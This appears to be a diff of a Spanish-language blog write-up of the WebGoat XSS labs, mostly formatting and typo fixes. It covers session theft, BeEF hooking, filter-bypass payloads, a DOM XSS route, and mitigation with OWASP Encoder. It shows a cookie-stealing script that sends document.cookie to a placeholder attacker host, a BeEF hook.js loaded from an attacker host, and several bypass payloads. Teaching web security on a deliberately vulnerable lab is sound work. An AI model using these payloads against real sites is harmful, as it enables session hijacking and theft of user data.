@@ -29,7 +29,7 @@ Aunque algo subestimados, los riesgos de seguridad asociados al **XSS** son tan 
 Quizás el truco más simple y común sea el robo de sesiones. Tengamos presente que si las cookies del aplicativo web no tienen el atributo **HTTPOnly** habilitado, vamos a poder accederlas por medio de **document.cookie** y la forma de envio a un tercer servidor, puede ser tan simple como incluirlo en una petición get de una imagen, como el siguiente ejemplo: 
 
 Se inyecta el siguiente payload. 
-```JavaScript
+```javascript
 <script>new Image().src="http://[ATTACK]/bogus.php?session="+document.cookie;</script>
 ``` 
 El navegador, al interpretar el código **JS**, intenta realizar una conexión a este origen de imagen concatenandole la **COOKIE** de la victima: 
@@ -56,7 +56,7 @@ Esta herramienta es un excelente ejemplo de lo que se puede realizar y como al c
 ![ping](/assets/webgoat/A7/04_ping.PNG)
 _Ping en JavaScript_
 
-### **Ataques de Ingenería Social**
+### **Ataques de Ingeniería Social**
 Existen muchas otras formas de aprovechar la ejecución de código **JavaScript** en el navegador del cliente, y entre las más interesantes se encuentran aquellas funciones que sirven de apoyo para un ataque de ingeniería social, basandonos en el hecho de que con JS tenemos control completo sobre el DOM de lo que visualiza la victima, por lo que podemos alterarlo y agregar, quitar o simular otras funcionalidades. 
 
 - [BeEF - The Browser Exploitation Framework Project](https://beefproject.com/)
@@ -65,13 +65,13 @@ Este grandioso framework tiene un funcionamiento muy interesante que nos permite
 
 Para enlazar el funcionamiento del **BeEF** a nuestro **XSS**, debemos inyectar un payload que haga uso del ``hook.js`` especialmente diseñado por el framework, el cual realiza una conexión recurrente al servidor central en busca de acciones a ejecutar, o la forma de enviar algún resultado previo. 
 
-```JavaScript
+```javascript
 <script src="http://[attack]/hook.js">
 ```
 
-También es posible subir completamente el servicio de BeEF y hacer uso de su laboratorio demo, el cual ya incluye el ``hook.js``. 
+También es posible subir completamente el servicio de **BeEF** y hacer uso de su laboratorio demo, el cual ya incluye el ``hook.js``. 
 
-- http://[ATTACK]:3000/demos/butcher/index.html
+- ``http://[ATTACK]:3000/demos/butcher/index.html``
 
 Se tiene un dashboard donde se listan todos las victimas conectadas a nuestro sitio malicioso o que hicieron click en el enlace que explota el **XSS**. 
 
@@ -105,7 +105,7 @@ Al tener este comportamiento, se puede inyectar código **JS** dentro de las eti
 ![Alert XSS](/assets/webgoat/A7/09_xss_alert.png)
 _Alert XSS_
 
-Es un escenario básico de explotación de XSS, así que verificaquemos a nivel de código cómo se produce esta vulnerabilidad y cómo se puede mitigar. 
+Es un escenario básico de explotación de **XSS**, así que verificaquemos a nivel de código cómo se produce esta vulnerabilidad y cómo se puede mitigar. 
 
 #### Mitigación
 El archivo donde se encuentra la vulnerabilidad es: 
@@ -117,7 +117,7 @@ Y se evidencia que el parámetro ``field1`` es concatenado de forma directa a la
 ![Código Vulnerable](/assets/webgoat/A7/10_codigo_field1.png)
 _Código Vulnerable_
 
-Es por esto que al incluir payloads con etiquetas html y código JS, el navegador lo interpretaba como si hiciera parte valida del aplicativo. 
+Es por esto que al incluir payloads con etiquetas **html** y código **JS**, el navegador lo interpretaba como si hiciera parte valida del aplicativo. 
 
 La mitigación de esta vulnerabilidad consiste en realizar un proceso previo de filtrado y saneamiento del parámetro ``field1`` antes de incluir lo en la respuesta. Esto se puede realizar usando la librería ``org.owasp.encoder.Encode.forHtml()`` para **Java**, lo que permite cambiar la códificación de salida en [HTML Entitys](https://www.w3schools.com/html/html_entities.asp): 
 
@@ -129,7 +129,7 @@ De esta manera tenemos una mitigación robusta sobre esta funcionalidad vulnerab
 - **¿Y si elimino todos los ``<script>``?**
 Esta es la forma más "común" e insegura de mitigar vulnerabilidades que se dan por mal saneamiento de datos, ya que se intenta atacar directamente el payload y no el significado. Pongamos un ejemplo: 
 
-> El desarrollador deduce que la vulnerabilidad real esta en permitir la etiqueta ``<script>`` ya que por medio de esta es que se ejecuta el código JS. Basado en esto, considera que la forma más eficiente de mitigar es realizando un replace sobre dicha expresión. 
+> El desarrollador deduce que la vulnerabilidad real esta en permitir la etiqueta ``<script>`` ya que por medio de esta es que se ejecuta el código **JS**. Basado en esto, considera que la forma más eficiente de mitigar es realizando un replace sobre dicha expresión. 
 
 En general esta situación es muy común y aunque parece una posible solución, su debilidad se fundamenta en el uso de una ``Lista Negra`` de expresiones, extensiones o etiquetas que considera no se deben permitir, sin embargo, el uso de ```Listas Negras`` nos obliga a considerar todos los escenarios y posibles formas del contenido dañino. 
 
@@ -146,16 +146,16 @@ Aunque la vulnerabilidad parece mitagada a nivel de código, ¿Qué sucede si in
 - ``<embed src="javascript:alert(1)">``
 - Etc.. [Aquí podemos consultar muchos más payloads](https://github.com/payloadbox/xss-payload-list)
 
-Otro caso sería si se realiza una ``Lista Blanca``, en la que con una expresión regular se valida que únicamente se acepten caracteres pertencientes al abecedario; pero eso queda de tarea :). 
+Otro caso sería si se realiza una ``Lista Blanca``, en la que con una expresión regular se valida que únicamente se acepten caracteres pertencientes al abecedario; **pero eso queda de tarea :)**. 
 
 ### XSS - 10 - 11 
-Este es otro laboratorio básico en el que se debe explotar un XSS - DOM, el cual como nos indica la descripción del ejercicio, se encuentra en una funcionalidad routes a nivel del código JavaScript del aplciativo, por lo que procedemos a su busqueda. 
+Este es otro laboratorio básico en el que se debe explotar un **XSS - DOM**, el cual como nos indica la descripción del ejercicio, se encuentra en una funcionalidad routes a nivel del código JavaScript del aplciativo, por lo que procedemos a su busqueda. 
 
 - Vamos a al **depurador** de la herramienta de desarrollo de nuestro navegador. 
-- Tecleamos ``Ctrl + Shift + F`` lo cual nos permite buscar en todos los archivos JS. 
+- Tecleamos ``Ctrl + Shift + F`` lo cual nos permite buscar en todos los archivos **JS**. 
 - Buscamos por el termino **route**.
 
-Identificamos el archivo donde se encuentran las routes que se manejan desde JS: 
+Identificamos el archivo donde se encuentran las routes que se manejan desde **JS**: 
 - ``/WebGoat/js/goatApp/view/GoatRouter.js``
 
 ![Identificación de las Routes](/assets/webgoat/A7/13_dom_routes.png)
@@ -167,7 +167,7 @@ Como se puede observar, existe una route llamada ``test/:param``, la cual recibe
 ![Función showTestParam](/assets/webgoat/A7/14_dom_showTestParam.png)
 _Función showTestParam_
 
-Una vez en este punto, se identifica que el ``:param`` es concatenado en una vista junto con ``"test:" + param``, lo que nos indica que la forma de inyectar nuestro payload para explotar el XSS, es accediendo a la siguiente URL: 
+Una vez en este punto, se identifica que el ``:param`` es concatenado en una vista junto con ``"test:" + param``, lo que nos indica que la forma de inyectar nuestro payload para explotar el **XSS**, es accediendo a la siguiente **URL**: 
 
 - /WebGoat/start.mvc#test/**devsec**
     - Donde ``#test/`` es la route a la que llamamos.
@@ -186,7 +186,7 @@ Ahora, según nos indica el reto se debe hacer un llamado a la funcionalidad ``w
 
 - Payload: ``<script>webgoat.customjs.phoneHome()</script>``
 - Payload Encoded URL: ``%3Cscript%3Ewebgoat%2Ecustomjs%2EphoneHome%28%29%3C%2Fscript%3E``
-- URL: /WebGoat/start.mvc#test/%3Cscript%3Ewebgoat%2Ecustomjs%2EphoneHome%28%29%3C%2Fscript%3E
+- URL: /WebGoat/start.mvc#test/``%3Cscript%3Ewebgoat%2Ecustomjs%2EphoneHome%28%29%3C%2Fscript%3E``
 
 Hacemos la busqueda del número en nuestra consola del navegador, aunque también se puede visualizar por medio de un ``alert()``. 
 
@@ -203,7 +203,7 @@ En caso de que queramos conservar el **route** vulnerable, debemos realizar una 
 
 ```javascript
 var filtrado= Encoder.encodeForJS(Encoder.encodeForHTML(param));
-this.$el.find('.lesson-content').html('test:' + param);
+this.$el.find('.lesson-content').html('test:' + filtrado);
 ```
 
 # Referencias: 
